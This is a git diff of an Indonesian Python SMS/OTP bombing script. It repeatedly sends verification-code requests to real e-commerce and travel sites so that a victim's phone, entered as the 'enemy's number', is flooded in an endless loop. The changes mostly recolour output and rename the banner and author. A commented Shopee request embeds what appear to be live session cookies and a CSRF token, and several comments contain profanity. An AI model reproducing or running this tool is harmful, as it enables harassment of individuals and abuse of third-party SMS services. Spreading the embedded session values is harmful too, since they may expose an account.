@@ -76,28 +76,28 @@ def countdown(time_sec):
     } # Mengubah keterangan hari menjadi bahasa Indonesia
     hari = hari_hari.get(keterangan_hari)
 
-    print(f"{timeformat} | {biru}{hari}, {keterangan_tanggal} {bulan} {keterangan_tahun} | {kuning}Waktu {keterangan_jam}",end='\r')
+    print(f"{timeformat} | {putih}{hari}, {keterangan_tanggal} {bulan} {keterangan_tahun} | {putih}Waktu {keterangan_jam}",end='\r')
     time.sleep(1)
     time_sec -= 1
 
 def tanya(nomor):
     check_input = 0
     while check_input == 0:
-        a = input(f"""{merah}Apakah Kamu ingin mengulangi Spam Tools? y/t {putih}Input Kamu: {hijau}""")
+        a = input(f"""{putih}Apakah Kamu ingin mengulangi Spam Tools? y/t {putih}Input Kamu: {putih}""")
         if a == "y" or a == "Y":
             check_input = 1
             start(nomor,1)
             break
         elif a == "t" or a == "T":
             check_input = 1
-            autoketik(f"{hijau}Berhasil Keluar Dari Tools")
+            autoketik(f"{putih}Berhasil Keluar Dari Tools!")
             sys.exit()
             break
         else:
             print("Masukan Pilihan Dengan Benar!")
             sys.exit
 
-def jam(nomor): # Jangan hapus code ngentod!
+def jam(nomor): # Jangan hapus!
     autoketik("Program Berjalan!")
     b   = nomor[1:12] # Contoh nomor = 081319196666
     c   = "62" + b    # Contoh nomor = 6281319196666
@@ -194,14 +194,14 @@ def jam(nomor): # Jangan hapus code ngentod!
             # Tokko = requests.post("https://api.tokko.io/graphql",headers={"Host":"api.tokko.io","accept-language":"id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"SMS","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})).text
             # Ginee = requests.post("https://accounts.ginee.com/api/iam-service/account/send-verification-code",headers={"Host":"accounts.ginee.com","Connection":"keep-alive","Content-Length":"114","Accept":"application/json, text/plain, */*","Content-Type":"application/json;charset=UTF-8","Accept-Language":"en","sec-ch-ua-mobile":"?1","User-Agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","Origin":"https://accounts.ginee.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://accounts.ginee.com/accounts/registered?system_id=SAAS&from=OFFICIAL_SITE&country=ID&utm_source=Article&utm_campaign=Ginee_ID","Accept-Encoding":"gzip, deflate, br"},data=json.dumps({"account":"0"+nomor,"countryCode":"ID","verificationPurpose":"USER_REGISTRATION","verificationType":"PHONE"})).text
             Misteraladin = requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers={"Host":"m.misteraladin.com","accept-language":"id","sec-ch-ua-mobile":"?1","content-type":"application/json","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","x-platform":"mobile-web","sec-ch-ua-platform":"Android","origin":"https://m.misteraladin.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.misteraladin.com/account","accept-encoding":"gzip, deflate, br"},data=json.dumps({"phone_number_country_code":"62","phone_number":nomor,"type":"register"})).text
-            autoketik(f"{hijau}Sukses Mengirim Spam")
+            autoketik(f"{putih}Sukses Mengirim Spam!")
             countdown(120) # Jangan Diubah !!!!
 
         except requests.exceptions.ConnectionError: # Error Handling ketika Request Time Out di salah satu URL API
             if RTO_flag == 0:
                 print("")
                 autoketik("--Request Time Out--") # Flag ketika memasuki RTO di salah satu URL API
-                print(f"{putih}Proses Automatis dialihkan ke Requests Alternatif{hijau}")
+                print(f"{merah}Proses Automatis dialihkan ke Requests Alternatif{merah}")
             
             #Shopee_fromme = requests.post("https://shopee.co.id/api/v4/otp/send_vcode", data=({"phone":c,"force_channel":"true","operation":7,"channel":2,"supported_channels":[1,2,3]}), headers={"Host": "shopee.co.id","content-length": "101","sec-ch-ua": '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',"sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36","x-api-source": "rweb","content-type": "application/json","accept": "application/json","x-shopee-language": "id","x-requested-with": "XMLHttpRequest","save-data": "on","x-csrftoken": "I8eSRy1l27NAL6ES8c9l05vVmpJMp8wd","sec-ch-ua-platform": "Android","origin": "https://shopee.co.id","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://shopee.co.id/buyer/login/otp","accept-encoding": "gzip, deflate, br","accept-language": "en-US,en;q=0.9,id;q=0.8","cookie": "REC_T_ID=e7bfd49e-b230-11ec-bdcc-2cea7f46f39f","cookie": "SPC_F=Yf7DlOX2KwKeJ6yxi33XqWZstVlia8Ij","cookie": "SPC_IA=-1","cookie": "SPC_EC=-","cookie": "SPC_U=-","cookie": "_fbp=fb.2.1648868371205.1740855633","cookie": 'SPC_T_IV="yDpgi7TnevEPzkP6tUtXTA=="',"cookie": 'SPC_T_ID="MJiQC0fDNrknKddvZtgby1td+rfZJY9g2kR201HodwKqnKK2u/tm/10VG/rodYQyTuutTi3ZoC1K1fFgZVax9H9pkCrcszlGYr7eUIjaBPY="',"cookie": "SPC_T_ID=MJiQC0fDNrknKddvZtgby1td+rfZJY9g2kR201HodwKqnKK2u/tm/10VG/rodYQyTuutTi3ZoC1K1fFgZVax9H9pkCrcszlGYr7eUIjaBPY=","cookie": "SPC_T_IV=yDpgi7TnevEPzkP6tUtXTA==","cookie": "_tt_enable_cookie=1","cookie": "_ttp=65634303-9bfb-4128-b793-66cce34fcbcc","cookie": "_gcl_au=1.1.1358726640.1664810870","cookie": "SPC_R_T_IV=yDpgi7TnevEPzkP6tUtXTA==","cookie": "SPC_R_T_ID=MJiQC0fDNrknKddvZtgby1td+rfZJY9g2kR201HodwKqnKK2u/tm/10VG/rodYQyTuutTi3ZoC1K1fFgZVax9H9pkCrcszlGYr7eUIjaBPY=","cookie": "_gcl_aw=GCL.1666763118.Cj0KCQjwkt6aBhDKARIsAAyeLJ2rV2TZKdPuQQnxt_OxJTdoZZL-9DX3JXaP9AN2JH6SNT-XmokLu4gaAvbxEALw_wcB","cookie": "_gac_UA-61904553-8=1.1666763118.Cj0KCQjwkt6aBhDKARIsAAyeLJ2rV2TZKdPuQQnxt_OxJTdoZZL-9DX3JXaP9AN2JH6SNT-XmokLu4gaAvbxEALw_wcB","cookie": "cto_bundle=FuapGV9VSUtwYSUyQjFxcldJS3pyZVpRS2dDNWljMU1iYklGY2o4aUFGN3RzSWZzWW9vR0xWZSUyQnowVWNjZEV1dGxTcWJ6RlI0djFXc29ldW9VYTRGS3A5Z0pTRFdkOWdnSnpSNHluVTBIZFFvQnIzbkw0ZEM4d1IwalljNjRzQ1RMWmsxZXowWm9TUGRoYzJsS0RJWVFLMFRuMElnJTNEJTNE","cookie": "G_ENABLED_IDPS=google","cookie": "SPC_CLIENTID=WWY3RGxPWDJLd0tlixyexcdwhhssnafo","cookie": "__LOCALE__null=ID","cookie": "csrftoken=I8eSRy1l27NAL6ES8c9l05vVmpJMp8wd","cookie": "SPC_SI=BTtfYwAAAAA1eHV3VEhIZaHNGwAAAAAANXVDUE12Vjc=","cookie": "_QPWSDCXHZQA=89e79a95-b4e7-4e2c-ca5f-646b5132e216","cookie": "HAS_BEEN_REDIRECTED=true","cookie": "_med=refer","cookie": "AMP_TOKEN=%24NOT_FOUND","cookie": "_gid=GA1.3.1224422653.1667393966","cookie": "_dc_gtm_UA-61904553-8=1","cookie": "ds=14616a0582a804162b5a32671f5190b6","cookie": "shopee_webUnique_ccd=wLB0rMarsqVlH1GMR3%2BUgQ%3D%3D%7CZHgs7vjE%2B9xeB0uOsISVQi4sKX%2BFUMZF5E8j5UDNn3ARItdtXAzik07aCdbS2nkpD%2B9bLh1c3458he6AyQgYK7HMl8zjcxStCiXH%7CO3uErT4xi%2BKxgDGC%7C06%7C3","cookie": "_ga=GA1.1.1922051288.1652344735","cookie": "_ga_SW6D8G0HXK=GS1.1.1667393964.52.1.1667394162.35.0.0","cookie": "_gali=app"})
             #Depop_from30 = requests.put("https://webapi.depop.com/api/auth/v1/verify/phone", data=json.dumps({"phone_number":nomor,"country_code":"ID"}), headers={"Host": "webapi.depop.com","accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36","Content-Type": "application/json","Accept-Encoding": "gzip, deflate, br", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",})
@@ -267,21 +267,21 @@ def jam(nomor): # Jangan hapus code ngentod!
             #Ginee = requests.post("https://accounts.ginee.com/api/iam-service/account/send-verification-code",headers={"Host":"accounts.ginee.com","Connection":"keep-alive","Content-Length":"114","Accept":"application/json, text/plain, */*","Content-Type":"application/json;charset=UTF-8","Accept-Language":"en","sec-ch-ua-mobile":"?1","User-Agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","Origin":"https://accounts.ginee.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://accounts.ginee.com/accounts/registered?system_id=SAAS&from=OFFICIAL_SITE&country=ID&utm_source=Article&utm_campaign=Ginee_ID","Accept-Encoding":"gzip, deflate, br"},data=json.dumps({"account":"0"+nomor,"countryCode":"ID","verificationPurpose":"USER_REGISTRATION","verificationType":"PHONE"})).text
             Misteraladin = requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers={"Host":"m.misteraladin.com","accept-language":"id","sec-ch-ua-mobile":"?1","content-type":"application/json","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","x-platform":"mobile-web","sec-ch-ua-platform":"Android","origin":"https://m.misteraladin.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.misteraladin.com/account","accept-encoding":"gzip, deflate, br"},data=json.dumps({"phone_number_country_code":"62","phone_number":nomor,"type":"register"})).text
                
-            autoketik(f"{hijau}Sukses Mengirim Spam")
+            autoketik(f"{putih}Sukses Mengirim Spam!")
             countdown(120) # Jangan diubah ngentod!
             RTO_flag = 1
             rto = 1 # Flag tunda
 
         except requests.exceptions.ConnectionError:
             print("")
-            autoketik("--Gagal membuat koneksi baru--")
+            autoketik("--Gagal membuat koneksi baru!--")
             time.sleep(1000) # Tunda 1000 detik
             rto = 1
 
         # https://urllib3.readthedocs.io/en/stable/reference/urllib3.exceptions.html
         except urllib3.exceptions.NewConnectionError: # Error Handling 2 ketika masih terjadi error berlebihan
             print("")
-            autoketik("--Gagal membuat koneksi baru--")
+            autoketik("--Gagal membuat koneksi baru!--")
             time.sleep(1000) # Tunda 1000 detik
             rto = 1
         
@@ -309,26 +309,26 @@ def jam(nomor): # Jangan hapus code ngentod!
 def start(nomor,x): # Def fungsi untuk start tools
     if x == 0: # Flag ketika pertama kali masuk ke dalam fungsi start()
         os.system("cls") # Clear terminal
-        autoketik(f"{merah}Infinite Loop Spam to {putih}{nomor} {merah}is {hijau}Ready!{hijau}") # Flag dimana program berjalan
+        autoketik(f"{putih}Infinite Loop Spam to {putih}{nomor} {putih}is {putih}Ready!{putih}") # Flag dimana program berjalan
         jam(nomor)
     else:
         print("")
         autoketik("--reboot tunggu 20 detik--")
         time.sleep(15) # Tunda 20 detik
         os.system("cls") # Clear terminal
-        autoketik(f"{merah}Mengulang Spam ke Nomor : {nomor}.....{hijau}") # Flag di mana program berjalan
+        autoketik(f"{ungu}Mengulang Spam ke Nomor : {nomor}.....{ungu}") # Flag di mana program berjalan
         jam(nomor)
 
 def main():
     os.system("cls") # Clear terminal agar cmd berwarna
-    autoketik(f"Selamat datang di {merah}MasWork")
-    print(f"""{kuning}Author : {hijau} Zaki Si Kumis Penggoda""")
+    autoketik(f"Selamat datang di {putih}Bundaran HI")
+    print(f"""{putih}Author : {putih} Kuli Jawa""")
     # Contoh : 081319196666
-    print(nomor := input(f"{hijau}Masukan Nomor Musuh : {putih}")) # Operator input nomor target
+    print(nomor := input(f"{putih}Masukan Nomor: {putih}")) # Operator input nomor target
     start(nomor,0) # Mulai Tools!
 
 try:
     main()
 except KeyboardInterrupt:
-    autoketik(f"""{merah}Batal Kumis {hijau}--Keluar dari Tools--""")
+    autoketik(f"""{putih}Batal Kumis {putih}--Keluar dari Tools--""")
     sys.exit()
